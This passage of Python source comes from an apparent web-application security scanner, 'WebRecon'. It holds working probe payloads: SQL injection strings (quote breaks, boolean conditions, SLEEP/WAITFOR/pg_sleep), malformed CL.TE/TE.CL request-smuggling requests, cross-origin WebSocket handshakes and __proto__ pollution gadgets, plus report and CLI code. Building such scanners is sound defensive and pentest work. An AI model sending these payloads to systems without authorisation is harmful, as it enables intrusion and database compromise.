                    add_finding(Finding(
                        title=f"Parameter Reflection (encoded) via `{pname}`",
                        severity=Severity.INFO,
                        description=f"Parameter `{pname}` is reflected in [{context}] but special characters appear encoded.",
                        evidence=f"URL: {test_url}\nContext: {context}",
                        recommendation="No immediate action; reflection noted for manual review.",
                        phase=phase), out, cfg)
        except Exception:
            continue
    if tested == 0:
        _log(out, "> No parameterised URLs available to probe for reflection.")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5+ — SQL INJECTION (error-based + boolean-differential + time-based)
# ═════════════════════════════════════════════════════════════════════════════

_SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning:\s+mysqli?_",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\)|pg_exec\(\)|postgresql.*error",
    r"sqlite_error|sqlite3::|near \".*\": syntax error",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"system\.data\.sqlclient\.sqlexception",
    r"org\.hibernate\.|javax\.persistence",
]

def phase_sqli(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Differential SQLi detection. Time-based confirmation only runs when
    intrusive checks are permitted (it sends SLEEP/pg_sleep payloads)."""
    phase = "sqli"
    if st.done(phase): return
    section("SQL Injection Probe", out)
    sess = make_session(cfg)

    targets = DISCOVERED.get_urls_with_params(limit=30)
    if not targets:
        _log(out, "> No parameterised URLs available for SQLi testing.")
        st.mark(phase); return

    err_re = re.compile('|'.join(_SQL_ERRORS), re.I)

    for tgt in targets:
        try:
            parsed = urlparse(tgt)
            qs = parse_qs(parsed.query)
        except Exception:
            continue
        if not qs:
            continue

        for pname, pvals in qs.items():
            orig = pvals[0] if pvals else "1"

            def build(value: str) -> str:
                nq = {k: (value if k == pname else v[0]) for k, v in qs.items()}
                q = '&'.join(f"{k}={v}" for k, v in nq.items())
                return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{q}"

            # ── Error-based ──
            try:
                er = sess.get(build(orig + "'\""), timeout=cfg.timeout)
                if err_re.search(er.text):
                    add_finding(Finding(
                        title=f"SQL Injection (error-based) via `{pname}`",
                        severity=Severity.CRITICAL,
                        description=f"Injecting a quote into `{pname}` produced a database error message.",
                        evidence=f"URL: {build(orig + chr(39) + chr(34))}\nMatched DB error in response.",
                        recommendation="Use parameterised queries / prepared statements. Never concatenate user input into SQL.",
                        phase=phase), out, cfg)
                    continue  # confirmed; move to next param
            except Exception:
                pass

            # ── Boolean-based differential ──
            try:
                base = sess.get(build(orig), timeout=cfg.timeout)
                true_url  = build(f"{orig}' AND '1'='1")
                false_url = build(f"{orig}' AND '1'='2")
                tr = sess.get(true_url, timeout=cfg.timeout)
                fr = sess.get(false_url, timeout=cfg.timeout)
                lt, lf, lb = len(tr.text), len(fr.text), len(base.text)
                # TRUE should resemble baseline; FALSE should differ markedly
                true_like_base = abs(lt - lb) < max(40, lb * 0.02)
                false_differs  = abs(lf - lt) > max(60, lt * 0.05)
                if tr.status_code == fr.status_code == 200 and true_like_base and false_differs:
                    add_finding(Finding(
                        title=f"SQL Injection (boolean-based) via `{pname}`",
                        severity=Severity.HIGH,
                        description=(f"Parameter `{pname}` shows boolean-differential behaviour: the TRUE "
                                     f"condition matches the baseline page while the FALSE condition diverges."),
                        evidence=(f"baseline={lb}B  TRUE(1=1)={lt}B  FALSE(1=2)={lf}B\n"
                                  f"TRUE:  {true_url}\nFALSE: {false_url}"),
                        recommendation="Use parameterised queries. Validate/whitelist input types.",
                        phase=phase), out, cfg)
                    continue
            except Exception:
                pass

            # ── Time-based confirmation (intrusive only) ──
            if not cfg.no_intrusive:
                try:
                    # Baseline latency (median of 2)
                    t0 = time.time(); sess.get(build(orig), timeout=cfg.timeout + 8); base_lat = time.time() - t0
                    payloads = [
                        f"{orig}' AND SLEEP(5)-- -",            # MySQL
                        f"{orig}'; WAITFOR DELAY '0:0:5'-- -",   # MSSQL
                        f"{orig}' AND pg_sleep(5)-- -",          # PostgreSQL
                    ]
                    for pl in payloads:
                        t0 = time.time()
                        sess.get(build(pl), timeout=cfg.timeout + 8)
                        delay = time.time() - t0
                        if delay > base_lat + 4:
                            # Confirm with a second, longer sleep to rule out jitter
                            confirm_pl = pl.replace("(5)", "(8)").replace("0:0:5", "0:0:8")
                            t0 = time.time(); sess.get(build(confirm_pl), timeout=cfg.timeout + 12)
                            delay2 = time.time() - t0
                            if delay2 > base_lat + 7:
                                add_finding(Finding(
                                    title=f"SQL Injection (time-based blind) via `{pname}`",
                                    severity=Severity.CRITICAL,
                                    description=f"Parameter `{pname}` shows a time delay tracking an injected SLEEP — blind SQLi.",
                                    evidence=(f"baseline≈{base_lat:.1f}s  5s-payload≈{delay:.1f}s  "
                                              f"8s-confirm≈{delay2:.1f}s\nPayload: {pl}"),
                                    recommendation="Use parameterised queries. This is exploitable blind SQLi — prioritise remediation.",
                                    phase=phase), out, cfg)
                                break
                except Exception:
                    pass
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5+ — HTTP REQUEST SMUGGLING (timing-based CL.TE / TE.CL)
# ═════════════════════════════════════════════════════════════════════════════

def _raw_send(host: str, port: int, use_tls: bool, raw: bytes, read_timeout: float) -> float:
    """Send a raw request over a fresh socket; return seconds until first byte
    or socket timeout. Raises on connection error."""
    import ssl as _ssl
    s = socket.create_connection((host, port), timeout=read_timeout)
    try:
        if use_tls:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.settimeout(read_timeout)
        t0 = time.time()
        s.sendall(raw)
        try:
            s.recv(64)
        except socket.timeout:
            return read_timeout
        return time.time() - t0
    finally:
        try: s.close()
        except Exception: pass


def phase_request_smuggling(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Timing-based HTTP/1.1 desync detection (CL.TE and TE.CL). A vulnerable
    front/back-end pair will stall waiting for body bytes that never arrive,
    producing a measurable delay versus a well-formed baseline. Intrusive."""
    phase = "request_smuggling"
    if st.done(phase): return
    section("HTTP Request Smuggling (timing probe)", out)
    if cfg.no_intrusive:
        _log(out, "> Request smuggling skipped (--no-intrusive)."); st.mark(phase); return
    if cfg.proxy:
        _log(out, "> Request smuggling skipped — raw socket probe is incompatible with --proxy.")
        st.mark(phase); return

    parsed = urlparse(cfg.base_url)
    host = parsed.hostname
    use_tls = parsed.scheme == 'https'
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or '/'

    CRLF = "\r\n"
    def _base(extra_headers: str, body: str) -> bytes:
        req = (f"POST {path} HTTP/1.1{CRLF}"
               f"Host: {host}{CRLF}"
               f"User-Agent: {cfg.user_agent}{CRLF}"
               f"{extra_headers}"
               f"Connection: close{CRLF}{CRLF}"
               f"{body}")
        return req.encode()

    try:
        # Baseline well-formed request
        baseline = _raw_send(host, port, use_tls,
                             _base(f"Content-Length: 0{CRLF}", ""), read_timeout=8.0)

        # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding.
        # Malformed TE makes a vulnerable back-end wait for a terminating chunk.
        clte_body = "1\r\nA\r\nX"  # incomplete final chunk
        clte = _base(f"Content-Length: {len(clte_body)}{CRLF}"
                     f"Transfer-Encoding: chunked{CRLF}", clte_body)
        clte_time = _raw_send(host, port, use_tls, clte, read_timeout=10.0)

        # TE.CL: front-end uses TE, back-end uses CL.
        tecl_body = "0\r\n\r\nX"
        tecl = _base(f"Content-Length: 4{CRLF}"
                     f"Transfer-Encoding: chunked{CRLF}", tecl_body)
        tecl_time = _raw_send(host, port, use_tls, tecl, read_timeout=10.0)

        _log(out, f"- baseline≈{baseline:.1f}s  CL.TE≈{clte_time:.1f}s  TE.CL≈{tecl_time:.1f}s")

        for label, t in (("CL.TE", clte_time), ("TE.CL", tecl_time)):
            if t > baseline + 4 and t >= 7.0:
                add_finding(Finding(
                    title=f"Possible HTTP Request Smuggling ({label})",
                    severity=Severity.HIGH,
                    description=(f"A {label}-shaped request stalled (~{t:.0f}s) versus a ~{baseline:.0f}s "
                                 f"baseline, consistent with a front-end/back-end desync. Requires manual "
                                 f"confirmation (timing alone can yield false positives behind some proxies)."),
                    evidence=f"baseline≈{baseline:.1f}s  {label}≈{t:.1f}s",
                    recommendation="Normalise/clamp ambiguous Content-Length vs Transfer-Encoding; reject requests with both. Confirm with a controlled differential test before reporting as exploitable.",
                    phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> Smuggling probe failed (likely benign): {e}")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5+ — WEBSOCKET DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def phase_websocket(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "websocket"
    if st.done(phase): return
    section("WebSocket Discovery", out)
    sess = make_session(cfg)

    ws_endpoints: Set[str] = set()
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        for m in re.finditer(r'wss?://[A-Za-z0-9_.\-:/]+', r.text):
            ws_endpoints.add(m.group(0))
        for m in re.finditer(r'new\s+WebSocket\(\s*["\']([^"\']+)', r.text):
            ws_endpoints.add(m.group(1))
    except Exception:
        pass
    # JS files already discovered
    with DISCOVERED._lock:
        js_urls = [u for u in DISCOVERED.urls if u.endswith('.js') or '.js?' in u][:15]
    for ju in js_urls:
        try:
            jr = sess.get(ju, timeout=cfg.timeout)
            for m in re.finditer(r'wss?://[A-Za-z0-9_.\-:/]+', jr.text):
                ws_endpoints.add(m.group(0))
            for m in re.finditer(r'new\s+WebSocket\(\s*["\']([^"\']+)', jr.text):
                ws_endpoints.add(m.group(1))
        except Exception:
            continue

    # Probe common WS paths via Upgrade handshake
    common_ws = ["/ws", "/wss", "/socket", "/socket.io/?EIO=4&transport=websocket",
                 "/cable", "/websocket", "/api/ws"]
    for path in common_ws:
        url = f"{cfg.base_url}{path}"
        try:
            key = base64.b64encode(os.urandom(16)).decode()
            r = sess.get(url, timeout=cfg.timeout, headers={
                "Connection": "Upgrade", "Upgrade": "websocket",
                "Sec-WebSocket-Version": "13", "Sec-WebSocket-Key": key,
                "Origin": "https://evil.example",
            }, allow_redirects=False)
            if r.status_code == 101 or 'sec-websocket-accept' in {k.lower() for k in r.headers}:
                ws_endpoints.add(url)
                add_finding(Finding(
                    title=f"WebSocket Endpoint Accepts Cross-Origin Handshake: {path}",
                    severity=Severity.MEDIUM,
                    description=(f"The WebSocket endpoint at {path} completed an Upgrade handshake with a "
                                 f"foreign Origin header — suggests missing origin validation (Cross-Site WebSocket Hijacking risk)."),
                    evidence=f"GET {url} (Origin: https://evil.example) → HTTP {r.status_code}",
                    recommendation="Validate the Origin header on WebSocket handshakes and tie sessions to anti-CSRF tokens.",
                    phase=phase), out, cfg)
        except Exception:
            continue

    if ws_endpoints:
        add_finding(Finding(
            title=f"WebSocket Endpoints Discovered ({len(ws_endpoints)})",
            severity=Severity.INFO,
            description="WebSocket endpoints were referenced or responded to handshakes.",
            evidence='\n'.join(sorted(ws_endpoints)[:20]),
            recommendation="Review WebSocket auth, origin checks, and message authorisation.",
            phase=phase), out, cfg)
    else:
        _log(out, "> No WebSocket endpoints discovered.")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5+ — PROTOTYPE POLLUTION PROBE (server-side reflection / fault)
# ═════════════════════════════════════════════════════════════════════════════

def phase_prototype_pollution(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "prototype_pollution"
    if st.done(phase): return
    section("Prototype Pollution Probe", out)
    sess = make_session(cfg)
    marker = "wrpp" + hashlib.md5(os.urandom(6)).hexdigest()[:6]

    # Endpoints to probe: discovered API endpoints + base
    with DISCOVERED._lock:
        endpoints = [urljoin(cfg.base_url, e) for e in list(DISCOVERED.endpoints)[:8]
                     if e.startswith('/')]
    endpoints = list(dict.fromkeys([cfg.base_url] + endpoints))

    hit = False
    for url in endpoints:
        # Query-string gadget
        qs_url = f"{url}{'&' if '?' in url else '?'}__proto__[{marker}]=polluted"
        try:
            base = sess.get(url, timeout=cfg.timeout)
            r = sess.get(qs_url, timeout=cfg.timeout)
            # Server-side fault: pollution that breaks rendering → 500 where baseline was 2xx
            if base.status_code < 500 <= r.status_code:
                add_finding(Finding(
                    title="Possible Prototype Pollution (server fault)",
                    severity=Severity.MEDIUM,
                    description=f"A `__proto__` gadget in the query string changed the response status from {base.status_code} to {r.status_code} at {url}.",
                    evidence=f"Baseline {url} → {base.status_code}\nPolluted {qs_url} → {r.status_code}",
                    recommendation="Reject/strip `__proto__`, `constructor`, `prototype` keys when merging untrusted objects. Use null-prototype objects or Map.",
                    phase=phase), out, cfg)
                hit = True
        except Exception:
            pass

        # JSON body gadget
        try:
            payload = {"__proto__": {marker: "polluted"}}
            base = sess.post(url, json={"x": 1}, timeout=cfg.timeout)
            r = sess.post(url, json=payload, timeout=cfg.timeout)
            if base.status_code < 500 <= r.status_code:
                add_finding(Finding(
                    title="Possible Prototype Pollution (JSON body, server fault)",
                    severity=Severity.MEDIUM,
                    description=f"A `__proto__` key in a JSON body changed the response status from {base.status_code} to {r.status_code} at {url}.",
                    evidence=f"POST {url} {{\"x\":1}} → {base.status_code}\nPOST __proto__ gadget → {r.status_code}",
                    recommendation="Sanitise keys before deep-merge; freeze Object.prototype; prefer Map/null-prototype objects.",
                    phase=phase), out, cfg)
                hit = True
            # Reflected marker on a prototype key is a strong signal
            elif marker in r.text and marker not in base.text:
                add_finding(Finding(
                    title="Prototype Pollution Gadget Reflected",
                    severity=Severity.LOW,
                    description=f"The injected `__proto__` marker was reflected in the response at {url} — investigate for pollution side-effects.",
                    evidence=f"POST {url} with __proto__[{marker}] → marker present in response.",
                    recommendation="Verify the server does not merge attacker keys into shared objects/prototypes.",
                    phase=phase), out, cfg)
                hit = True
        except Exception:
            pass

    if not hit:
        _log(out, "> No prototype pollution side-effects observed.")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# FINAL REPORTS (Markdown + HTML)
# ═════════════════════════════════════════════════════════════════════════════

def write_summary(cfg: ScanConfig, out: str, findings: List[Finding], start: datetime):
    duration = datetime.now() - start
    counts = Counter(f.severity for f in findings)
    _log(out, "\n\n---\n# Summary\n")
    _log(out, f"| Field | Value |\n|---|---|\n"
              f"| Target | `{cfg.target}` |\n"
              f"| Base URL | {cfg.base_url} |\n"
              f"| Profile | {cfg.profile.value} |\n"
              f"| Duration | {str(duration).split('.')[0]} |\n"
              f"| Total Findings | {len(findings)} |\n")
    _log(out, "\n## Findings by Severity\n")
    for sev in (Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO):
        _log(out, f"- **{sev.value}**: {counts.get(sev, 0)}")

    if cfg.diff_file:
        diff = diff_findings(findings, cfg.diff_file)
        if diff:
            _log(out, "\n## Delta vs Previous Scan\n")
            _log(out, f"- New: {len(diff.get('new', []))}")
            _log(out, f"- Resolved: {len(diff.get('resolved', []))}")
            _log(out, f"- Unchanged: {diff.get('unchanged', 0)}")
            if diff.get('new'):
                _log(out, "\n### New Findings\n" +
                          '\n'.join(f"- [{f['severity']}] {f['title']}" for f in diff['new']))
            if diff.get('resolved'):
                _log(out, "\n### Resolved\n" + '\n'.join(f"- {t}" for t in diff['resolved']))


def write_html_report(cfg: ScanConfig, html_path: str,
                       findings: List[Finding], start: datetime):
    """Emit a self-contained filterable HTML report."""
    duration = datetime.now() - start
    counts = Counter(f.severity for f in findings)
    rows = []
    for i, f in enumerate(sorted(findings, key=lambda x: -_SEV_ORDER[x.severity])):
        rows.append({
            "id": i, "title": f.title, "severity": f.severity.value,
            "description": f.description, "evidence": f.evidence,
            "recommendation": f.recommendation, "phase": f.phase,
            "timestamp": f.timestamp,
        })

    # Escape helper
    def esc(s):
        return (str(s).replace('&', '&amp;').replace('<', '&lt;')
                .replace('>', '&gt;').replace('"', '&quot;'))

    sev_colour = {
        "CRITICAL": "#8b0000", "HIGH": "#e74c3c", "MEDIUM": "#f39c12",
        "LOW":      "#27ae60", "INFO": "#3498db",
    }

    table_rows = ""
    for r in rows:
        c = sev_colour.get(r['severity'], '#555')
        table_rows += (
            f'<tr class="row" data-sev="{r["severity"]}">'
            f'<td><span class="badge" style="background:{c}">{r["severity"]}</span></td>'
            f'<td>{esc(r["title"])}</td>'
            f'<td>{esc(r["phase"])}</td>'
            f'<td><details><summary>show</summary>'
            f'<p><b>Description:</b> {esc(r["description"])}</p>'
            f'<pre>{esc(r["evidence"])}</pre>'
            f'<p><b>Recommendation:</b> {esc(r["recommendation"])}</p>'
            f'<p><i>Time:</i> {esc(r["timestamp"])}</p>'
            f'</details></td></tr>'
        )

    summary_cards = ""
    for sev in (Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO):
        c = sev_colour[sev.value]
        summary_cards += (f'<div class="card" style="border-left-color:{c}">'
                          f'<div class="sev">{sev.value}</div>'
                          f'<div class="num">{counts.get(sev, 0)}</div></div>')

    html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>WebRecon Report — {esc(cfg.target)}</title>
<style>
 * {{ box-sizing:border-box; }}
 body {{ font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
        margin:0; background:#0d1117; color:#c9d1d9; }}
 header {{ background:#161b22; padding:1.5rem 2rem; border-bottom:1px solid #30363d; }}
 h1 {{ margin:0; color:#58a6ff; }}
 .meta {{ color:#8b949e; font-size:.9rem; margin-top:.5rem; }}
 main {{ padding:2rem; max-width:1400px; margin:auto; }}
 .cards {{ display:grid; grid-template-columns:repeat(5, 1fr); gap:1rem; margin-bottom:2rem; }}
 .card {{ background:#161b22; padding:1rem; border-left:4px solid; border-radius:4px; }}
 .sev {{ font-size:.8rem; color:#8b949e; text-transform:uppercase; }}
 .num {{ font-size:2rem; font-weight:bold; color:#f0f6fc; }}
 .filters {{ margin-bottom:1rem; }}
 .filters button {{ background:#21262d; color:#c9d1d9; border:1px solid #30363d;
                   padding:.5rem 1rem; margin-right:.5rem; border-radius:4px; cursor:pointer; }}
 .filters button.active {{ background:#1f6feb; border-color:#1f6feb; color:white; }}
 input[type=text] {{ background:#0d1117; color:#c9d1d9; border:1px solid #30363d;
                    padding:.5rem; width:300px; border-radius:4px; }}
 table {{ width:100%; border-collapse:collapse; background:#161b22; border-radius:4px; overflow:hidden; }}
 th, td {{ padding:.75rem; text-align:left; border-bottom:1px solid #30363d; vertical-align:top; }}
 th {{ background:#21262d; color:#f0f6fc; font-weight:600; }}
 tr:hover {{ background:#1c2128; }}
 .badge {{ color:white; padding:.25rem .5rem; border-radius:3px; font-size:.75rem; font-weight:bold; }}
 pre {{ background:#0d1117; padding:.75rem; border-radius:4px; overflow:auto;
       white-space:pre-wrap; word-break:break-all; max-height:400px; }}
 details summary {{ cursor:pointer; color:#58a6ff; }}
 details[open] summary {{ margin-bottom:.5rem; }}
</style></head>
<body>
<header>
 <h1>WebRecon Report</h1>
 <div class="meta">
  <b>Target:</b> {esc(cfg.target)} &nbsp;|&nbsp;
  <b>Base URL:</b> {esc(cfg.base_url)} &nbsp;|&nbsp;
  <b>Profile:</b> {esc(cfg.profile.value)} &nbsp;|&nbsp;
  <b>Started:</b> {start.isoformat()} &nbsp;|&nbsp;
  <b>Duration:</b> {str(duration).split('.')[0]} &nbsp;|&nbsp;
  <b>Total:</b> {len(findings)} findings
 </div>
</header>
<main>
 <div class="cards">{summary_cards}</div>

 <div class="filters">
  <button class="filterbtn active" data-f="ALL">All</button>
  <button class="filterbtn" data-f="CRITICAL">Critical</button>
  <button class="filterbtn" data-f="HIGH">High</button>
  <button class="filterbtn" data-f="MEDIUM">Medium</button>
  <button class="filterbtn" data-f="LOW">Low</button>
  <button class="filterbtn" data-f="INFO">Info</button>
  <input type="text" id="search" placeholder="Search findings…">
 </div>

 <table>
  <thead><tr><th>Severity</th><th>Title</th><th>Phase</th><th>Details</th></tr></thead>
  <tbody>{table_rows}</tbody>
 </table>
</main>
<script>
 const btns = document.querySelectorAll('.filterbtn');
 const rows = document.querySelectorAll('tr.row');
 const search = document.getElementById('search');
 let activeFilter = 'ALL';
 function apply() {{
   const q = search.value.toLowerCase();
   rows.forEach(r => {{
     const sev = r.dataset.sev;
     const text = r.textContent.toLowerCase();
     const sevOk = activeFilter === 'ALL' || sev === activeFilter;
     const textOk = !q || text.includes(q);
     r.style.display = (sevOk && textOk) ? '' : 'none';
   }});
 }}
 btns.forEach(b => b.addEventListener('click', () => {{
   btns.forEach(x => x.classList.remove('active'));
   b.classList.add('active');
   activeFilter = b.dataset.f;
   apply();
 }}));
 search.addEventListener('input', apply);
</script>
</body></html>"""
    with open(html_path, 'w') as fh:
        fh.write(html)

# ═════════════════════════════════════════════════════════════════════════════
# ARGUMENT PARSING & MAIN
# ═════════════════════════════════════════════════════════════════════════════

def parse_args():
    p = ArgumentParser(
        description=f"WebRecon v{VERSION} — Comprehensive Web Application Enumeration",
        formatter_class=RawDescriptionHelpFormatter,
        epilog="""
Examples:
  web_app.py -t example.com
  web_app.py -t example.com --proxy http://127.0.0.1:8080 --oob-url xxx.oast.live
  web_app.py -t example.com --cookie "session=abc123" --auth-check-url https://example.com/profile --auth-check-text "Logout"
  web_app.py -t example.com --profile recon
  web_app.py -t example.com --profile stealth --nuclei-severity high,critical
  web_app.py -t example.com --auto --diff previous.findings.json
  web_app.py -t example.com --webhook-url https://discord.com/api/webhooks/... --pentestdb-url http://pi:5000
  web_app.py -t example.com --resume
  web_app.py -iL targets.txt --auto --profile stealth
        """)
    p.add_argument("-t", "--target",        help="Target domain or IP (host:port also accepted)")
    p.add_argument("-o", "--output",        default="webrecon", help="Output file prefix")
    p.add_argument("-iL", "--target-list",  dest="target_list",
                   help="File of targets, one per line (domain/IP/host:port; # comments and blank lines ignored). Each target is scanned in turn with its own <prefix>_<target>.* outputs.")
    p.add_argument("--auto",                action="store_true",
                   help="Skip interactive prompts (run all phases non-interactively)")
    p.add_argument("--proxy",               help="Proxy URL (e.g. http://127.0.0.1:8080)")
    p.add_argument("--user-agent",          default=DEFAULT_UA, help="Custom User-Agent")
    p.add_argument("--timeout",             type=int, default=10, help="HTTP timeout (s)")
    p.add_argument("--rate",                type=int, default=50, help="Per-phase thread/rate limit")
    p.add_argument("--delay",               type=float, default=0.0, help="Inter-request delay (s)")
    p.add_argument("--oob-url",             help="OOB callback host for XXE/SSRF (interactsh etc.)")
    p.add_argument("--scope-file",          help="Scope file: CIDRs (v4/v6) or domains, one per line")
    p.add_argument("--full-ports",          action="store_true", help="Full port scan (-p-)")
    p.add_argument("--google-api-key",      help="Google Custom Search API key")
    p.add_argument("--google-cx",           help="Google Custom Search Engine ID")
    p.add_argument("--google-dork-count",   type=int, default=5, help="Number of dorks to run via API (default 5)")
    p.add_argument("--diff",                dest="diff_file", help="Previous findings JSON for diff mode")
    p.add_argument("--resume",              action="store_true", help="Resume interrupted scan")
    p.add_argument("--fresh",               action="store_true", help="Clear state and start fresh")
    p.add_argument("--threads",             type=int, default=5, help="Parallel phase threads")
    p.add_argument("-v", "--verbose",       action="store_true", help="Show tool stderr")
    # Auth
    p.add_argument("--cookie",              help="Session cookie(s): 'name=val; name2=val2'")
    p.add_argument("--header",              action="append", default=[], dest="headers",
                   help="Extra header (repeatable): 'Authorization: Bearer xyz'")
    p.add_argument("--auth-check-url",      help="URL to verify session is still authenticated")
    p.add_argument("--auth-check-text",     help="Text expected in auth-check-url response")
    # Integrations
    p.add_argument("--webhook-url",         help="Discord/Slack webhook for HIGH+ findings")
    p.add_argument("--webhook-threshold",   default="HIGH",
                   choices=["INFO","LOW","MEDIUM","HIGH","CRITICAL"],
                   help="Minimum severity to notify webhook (default HIGH)")
    p.add_argument("--pentestdb-url",       help="PentestDB instance to POST findings to")
    p.add_argument("--pentestdb-token",     help="Bearer token for PentestDB API")
    # Scan control
    p.add_argument("--profile",             choices=[p.value for p in ScanProfile],
                   default=ScanProfile.FULL.value,
                   help="Scan profile: recon=passive only, active=+recon tools, full=everything, stealth=throttled")
    p.add_argument("--no-intrusive",        action="store_true",
                   help="Skip intrusive checks (Nikto, nuclei intrusive tags, etc.)")
    p.add_argument("--nuclei-severity",     default="medium,high,critical",
                   help="Nuclei severity filter (default: medium,high,critical)")
    p.add_argument("--no-html",             action="store_true", help="Skip HTML report generation")
    p.add_argument("--whatweb-timeout",      type=int, default=120,
                   help="WhatWeb timeout in seconds (default: 120)")
    p.add_argument("--arjun-timeout",        type=int, default=1200,
                   help="Arjun timeout in seconds (default: 1200)")
    return p.parse_args()


def _apply_profile(args, cfg: ScanConfig) -> ScanConfig:
    """Mutate cfg based on chosen scan profile."""
    if cfg.profile == ScanProfile.STEALTH:
        cfg.rate          = min(cfg.rate, 10)
        cfg.threads       = min(cfg.threads, 2)
        cfg.delay         = max(cfg.delay, 0.5)
        cfg.no_intrusive  = True
    elif cfg.profile == ScanProfile.RECON:
        cfg.no_intrusive  = True
    return cfg


def _target_prefix(base: str, target: str, batch: bool) -> str:
    """Single -t scans keep the bare prefix; batch scans get a per-target suffix."""
    if not batch:
        return base
    safe = re.sub(r'[^A-Za-z0-9._-]', '_', target)
    return f"{base}_{safe}"


def _reset_scan_state():
    """Clear all shared, scan-scoped globals between batch targets (in place,
    so existing references in the phase functions keep working)."""
    with _findings_lock:
        _findings.clear()
        _finding_keys.clear()
    with _MISSING_TOOLS_LOCK:
        _MISSING_TOOLS.clear()
    with DISCOVERED._lock:
        DISCOVERED.urls.clear()
        DISCOVERED.params.clear()
        DISCOVERED.endpoints.clear()
    with RateLimitedSession._lock:
        RateLimitedSession._consecutive_429   = 0
        RateLimitedSession._backoff_until     = 0.0
        RateLimitedSession._announced_backoff = False


def _print_batch_summary(results, batch_start):
    dur = datetime.now() - batch_start
    print(f"\n{Fore.MAGENTA}{'═'*60}")
    print(f"{Fore.GREEN}  BATCH COMPLETE — {len(results)} target(s) in {str(dur).split('.')[0]}")
    print(f"{Fore.MAGENTA}{'═'*60}")
    tot = Counter()
    for target, prefix, counts in results:
        tot.update(counts)
        print(f"  {Fore.WHITE}{target}")
        print(f"    {Fore.MAGENTA}{counts.get(Severity.CRITICAL,0)} CRIT  "
              f"{Fore.RED}{counts.get(Severity.HIGH,0)} HIGH  "
              f"{Fore.YELLOW}{counts.get(Severity.MEDIUM,0)} MED  "
              f"{Fore.GREEN}{counts.get(Severity.LOW,0)} LOW  "
              f"{Fore.CYAN}{counts.get(Severity.INFO,0)} INFO   "
              f"{Fore.WHITE}→ {prefix}.report.html")
    print(f"\n{Fore.WHITE}  TOTAL  "
          f"{Fore.MAGENTA}{tot.get(Severity.CRITICAL,0)} CRIT  "
          f"{Fore.RED}{tot.get(Severity.HIGH,0)} HIGH  "
          f"{Fore.YELLOW}{tot.get(Severity.MEDIUM,0)} MED  "
          f"{Fore.GREEN}{tot.get(Severity.LOW,0)} LOW  "
          f"{Fore.CYAN}{tot.get(Severity.INFO,0)} INFO")
    print(f"{Fore.MAGENTA}{'═'*60}\n")


def _load_targets(args) -> List[str]:
    """Return the list of raw target strings: from -iL file, or a single -t / prompt."""
    if args.target_list:
        if not os.path.exists(args.target_list):
            print(f"{Fore.RED}  [!] Target list not found: {args.target_list}"); sys.exit(1)
        out = []
        with open(args.target_list) as fh:
            for line in fh:
                line = line.split('#', 1)[0].strip()  # strip inline comments
                if line:
                    out.append(line)
        if not out:
            print(f"{Fore.RED}  [!] Target list is empty: {args.target_list}"); sys.exit(1)
        return out
    raw = args.target or input(f"{Fore.CYAN}  Target (domain or IP): ").strip()
    return [raw]


def main():
    args = parse_args()

    print(f"\n{Fore.MAGENTA}{'═'*60}")
    print(f"{Fore.MAGENTA}  WebRecon v{VERSION}")
    print(f"{Fore.MAGENTA}{'═'*60}\n")

    scope = ScopeChecker(args.scope_file)

    # Resolve, validate, sanitise and scope-check every target up front;
    # invalid / out-of-scope entries are skipped (not fatal) in batch mode.
    targets = _load_targets(args)
    batch = bool(args.target_list) or len(targets) > 1
    work, seen = [], set()
    for rawt in targets:
        t = normalise(rawt)
        if t in seen:
            continue
        seen.add(t)
        tt = validate(t)
        if not tt:
            print(f"{Fore.YELLOW}  [SKIP] Invalid target: {t!r}"); continue
        try:
            sanitise(t)
        except ValueError as e:
            print(f"{Fore.YELLOW}  [SKIP] {e}"); continue
        if not scope.check(t):
            print(f"{Fore.YELLOW}  [SKIP] Out of scope: {t}"); continue
        work.append((t, tt))

    if not work:
        print(f"{Fore.RED}  [!] No valid, in-scope targets — aborting."); sys.exit(1)
    if batch:
        print(f"{Fore.CYAN}  Batch mode: {len(work)} target(s) queued.")

    batch_start = datetime.now()
    results = []
    for idx, (t, tt) in enumerate(work, 1):
        if batch:
            print(f"\n{Fore.MAGENTA}{'━'*60}")
            print(f"{Fore.MAGENTA}  [{idx}/{len(work)}]  {t}")
            print(f"{Fore.MAGENTA}{'━'*60}")
        prefix = _target_prefix(args.output, t, batch)
        try:
            counts = run_single_target(args, t, tt, scope, prefix)
            results.append((t, prefix, counts))
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}  Batch interrupted — stopping after {idx} target(s). "
                  f"Re-run with --resume to continue this target.")
            results.append((t, prefix, Counter(f.severity for f in _findings)))
            break
        except SystemExit:
            raise
        except Exception as e:
            print(f"{Fore.RED}  [!] {t} failed: {e}")
            results.append((t, prefix, Counter()))

    if batch:
        _print_batch_summary(results, batch_start)


def run_single_target(args, target, tt, scope, output_prefix):
    """Run a complete scan against one target. Returns a severity Counter."""
    out       = output_prefix + ".md"
    findings  = output_prefix + ".findings.json"
    state_f   = output_prefix + ".state.json"
    html_path = output_prefix + ".report.html"

    # Fresh per-target globals so findings / dedup / discovery / rate-limit
